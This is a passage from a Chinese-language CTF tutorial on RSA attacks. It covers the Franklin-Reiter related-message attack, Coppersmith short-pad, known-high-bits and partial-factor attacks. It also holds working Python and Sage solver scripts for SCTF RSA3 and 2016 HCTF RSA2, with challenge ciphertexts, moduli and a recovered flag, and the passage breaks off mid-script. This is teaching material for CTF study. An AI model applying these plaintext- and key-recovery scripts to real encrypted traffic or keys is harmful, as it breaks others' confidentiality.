\\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N \u90a3\u4e48\u6211\u4eec\u6709 C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N \u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 \u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2 (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N \u6839\u636e\u5f0f 1 \u6211\u4eec\u6709 a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N \u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N \u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97 (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N \u8fdb\u800c\u6211\u4eec\u6709 aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} \u8fdb\u800c aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} \u8fdb\u800c M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} \u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002 \u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb A New Related Message Attack on RSA \u4ee5\u53ca paper \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002 SCTF RSA3 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b import gmpy2 id1 = 1002 id2 = 2614 c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 a = 1 b = id1 - id2 def getmessage ( a , b , c1 , c2 , n ): b3 = gmpy2 . powmod ( b , 3 , n ) part1 = b * ( c1 + 2 * c2 - b3 ) % n part2 = a * ( c1 - c2 + 2 * b3 ) % n part2 = gmpy2 . invert ( part2 , n ) return part1 * part2 % n message = getmessage ( a , b , c1 , c2 , n ) - id2 message = hex ( message )[ 2 :] if len ( message ) % 2 != 0 : message = '0' + message print message . decode ( 'hex' ) \u5f97\u5230\u660e\u6587 \u279c sctf-rsa3-level3 git: ( master ) \u2717 python exp.py F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002 import binascii def attack ( c1 , c2 , b , e , n ): PR .< x >= PolynomialRing ( Zmod ( n )) g1 = x ^ e - c1 g2 = ( x + b ) ^ e - c2 def gcd ( g1 , g2 ): while g2 : g1 , g2 = g2 , g1 % g2 return g1 . monic () return - gcd ( g1 , g2 )[ 0 ] c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 e = 3 a = 1 id1 = 1002 id2 = 2614 b = id2 - id1 m1 = attack ( c1 , c2 , b , e , n ) print binascii . unhexlify ( \" %x \" % int ( m1 - id1 )) \u7ed3\u679c\u5982\u4e0b \u279c sctf-rsa3-level3 git: ( master ) \u2717 sage exp.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL \u9898\u76ee \u00b6 hitcon 2014 rsaha N1CTF 2018 rsa_padding Coppersmith\u2019s short-pad attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002 \u8fd9\u91cc\u6240\u8c13 padding \u8fc7\u77ed\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5e94\u7684\u591a\u9879\u5f0f\u7684\u6839\u4f1a\u8fc7\u5c0f\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u6211\u4eec\u5047\u8bbe\u7231\u4e3d\u4e1d\u8981\u7ed9\u9c8d\u52c3\u53d1\u9001\u6d88\u606f\uff0c\u9996\u5148\u7231\u4e3d\u4e1d\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C1\uff0c\u53d1\u9001\u7ed9\u9c8d\u52c3\u3002\u8fd9\u65f6\uff0c\u4e2d\u95f4\u4eba\u76ae\u7279\u622a\u83b7\u4e86\u5bc6\u6587\u3002\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u7231\u4e3d\u4e1d\u6ca1\u6709\u6536\u5230\u9c8d\u52c3\u7684\u56de\u590d\uff0c\u518d\u6b21\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C2\uff0c\u53d1\u9001\u7ed9 Bob\u3002\u76ae\u7279\u518d\u4e00\u6b21\u622a\u83b7\u3002\u8fd9\u65f6\uff0c\u76ae\u7279\u5c31 \u53ef\u80fd \u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u539f\u7406\u89e3\u5bc6\u3002 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570 N \u7684\u957f\u5ea6\u4e3a k\uff0c\u5e76\u4e14 padding \u7684\u957f\u5ea6\u4e3a m=\\lfloor \\frac{k}{e^2} \\rfloor m=\\lfloor \\frac{k}{e^2} \\rfloor \u3002\u6b64\u5916\uff0c\u5047\u8bbe\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u7684\u957f\u5ea6\u6700\u591a\u4e3a k-m \u6bd4\u7279\uff0cpadding \u7684\u65b9\u5f0f\u5982\u4e0b M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m \u6d88\u606f M2 \u7684 padding \u65b9\u5f0f\u7c7b\u4f3c\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u89e3\u5bc6\u3002 \u9996\u5148\u5b9a\u4e49 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 \u5176\u4e2d y=r_2-r_1 y=r_2-r_1 \u3002\u663e\u7136\u8fd9\u4e24\u4e2a\u65b9\u7a0b\u5177\u6709\u76f8\u540c\u7684\u6839 M1\u3002\u7136\u540e\u8fd8\u6709\u4e00\u7cfb\u5217\u7684\u63a8\u5bfc\u3002 Known High Bits Message Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b C\\equiv m^d \\bmod N C\\equiv m^d \\bmod N \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 m_0 m_0 \uff0c\u5373 m=m_0+x m=m_0+x \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 x x \u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 x \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002 \u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 Factoring with High Bits Known \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002 \u653b\u51fb\u5de5\u5177 \u00b6 \u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801 beta = 0.5 dd = f . degree () epsilon = beta / 7 mm = ceil ( beta ** 2 / ( dd * epsilon )) tt = floor ( dd * mm * (( 1 / beta ) - 1 )) XX = ceil ( N ** (( beta ** 2 / dd ) - epsilon )) + 1000000000000000000000000000000000 roots = coppersmith_howgrave_univariate ( f , N , beta , mm , tt , XX ) \u5176\u4e2d\uff0c \u5fc5\u987b\u6ee1\u8db3 q\\geq N^{beta} q\\geq N^{beta} \uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 beta=0.5 beta=0.5 \uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002 XX \u662f f(x)=q'+x f(x)=q'+x \u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 q' q' \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002 2016 HCTF RSA2 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b from pwn import * from hashlib import sha512 sh = remote ( '127.0.0.1' , 9999 ) context . log_level = 'debug' def sha512_proof ( prefix , verify ): i = 0 pading = \"\" while True : try : i = randint ( 0 , 1000 ) pading += str ( i ) if len ( pading ) > 200 : pading = pading [ 200 :] #print pading except StopIteration : break r = sha512 ( prefix + pading ) . hexdigest () if verify in r : return pading def verify (): sh . recvuntil ( \"Prefix: \" ) prefix = sh . recvline () print len ( prefix ) prefix = prefix [: - 1 ] prefix = prefix . decode ( 'base64' ) proof = sha512_proof ( prefix , \"fffffff\" ) sh . send ( proof . encode ( 'base64' )) if __name__ == '__main__' : verify () print 'verify success' sh . recvuntil ( \"token: \" ) token = \"5c9597f3c8245907ea71a89d9d39d08e\" sh . sendline ( token ) sh . recvuntil ( \"n: \" ) n = sh . readline () . strip () n = int ( n [ 2 :], 16 ) sh . recvuntil ( \"e: \" ) e = sh . readline () . strip () e = int ( e [ 2 :], 16 ) sh . recvuntil ( \"e2: \" ) e2 = sh . readline () . strip () e2 = int ( e2 [ 2 :], 16 ) sh . recvuntil ( \"is: \" ) enc_flag = sh . readline () . strip () enc_flag = int ( enc_flag [ 2 : - 1 ], 16 ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) print \"e2: \" , hex ( e2 ) print \"flag: \" , hex ( enc_flag ) \u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b n : 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f e : 0x10001 e2 : 0xf93b flag : 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 \u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa p , q , e = gen_key () n = p * q phi_n = ( p - 1 ) * ( q - 1 ) d = invmod ( e , phi_n ) while True : e2 = random . randint ( 0x1000 , 0x10000 ) if gcd ( e2 , phi_n ) == 1 : break \u6211\u4eec\u5f97\u5230\u7684 n=p \\times q n=p \\times q \u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728 gen_key \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b gen_key \u51fd\u6570 def gen_key (): while True : p = getPrime ( k / 2 ) if gcd ( e , p - 1 ) == 1 : break q_t = getPrime ( k / 2 ) n_t = p * q_t t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) u = pi_b ( p4 , 1 ) n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570 k=2048 e=0x10001 k=2048 e=0x10001 \u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14 gcd(2,p-1)=1 \u3002 \u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 q_t q_t \uff0c\u5e76\u4e14\u8ba1\u7b97 n_t=p \\times q_t n_t=p \\times q_t \u3002 \u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86 get_bit \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b def get_bit ( number , n_bit , dire ): ''' dire: 1: left 0: right ''' if dire : sn = size ( number ) if sn % 8 != 0 : sn += ( 8 - sn % 8 ) return number >> ( sn - n_bit ) else : return number & ( pow ( 2 , n_bit ) - 1 ) \u53ef\u4ee5\u770b\u51fa\u6839\u636e dire(ction) \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570 dire=1 \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97 number \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570 sn \uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06 sn \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de number \u53f3\u79fb sn-n_bit \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559 number \u7684 n_bit \u4f4d\u3002 dire=0 \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6 number \u7684\u4f4e n_bit \u4f4d\u3002 \u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) \u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5 t \u4e3a n_t \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 y \u4e3a n_t \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002 p4 \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 \u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c u = pi_b ( p4 , 1 ) \u5229\u7528 pi_b \u5bf9 p4 \u8fdb\u884c\u4e86\u52a0\u5bc6 def pi_b ( x , m ): ''' m: 1: encrypt 0: decrypt ''' enc = DES . new ( key ) if m : method = enc . encrypt else : method = enc . decrypt s = long_to_bytes ( x ) sp = [ s [ a : a + 8 ] for a in xrange ( 0 , len ( s ), 8 )] r = \"\" for a in sp : r += method ( a ) return bytes_to_long ( r ) \u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002 \u4e0b\u9762 n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de q' \u3002 \u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86 n'=p*q' \u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b n'=p * ( q + random(2^{k/16})) \u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684 k/2+k/16=9k/16 k/2+k/16=9k/16 \u6bd4\u7279\u4f4d\u3002 \u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002 \u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b u=hex(n)[2:-1][-480:-320] \u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b if __name__ == \"__main__\" : n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f u = hex ( n )[ 2 : - 1 ][ - 480 : - 320 ] u = int ( u , 16 ) p4 = pi_b ( u , 0 ) print hex ( p4 ) \u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b \u279c 2016 - HCTF - RSA2 git :( master ) \u2717 python exp_p4 . py 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 L \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d from sage.all import * import binascii n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f p4 = 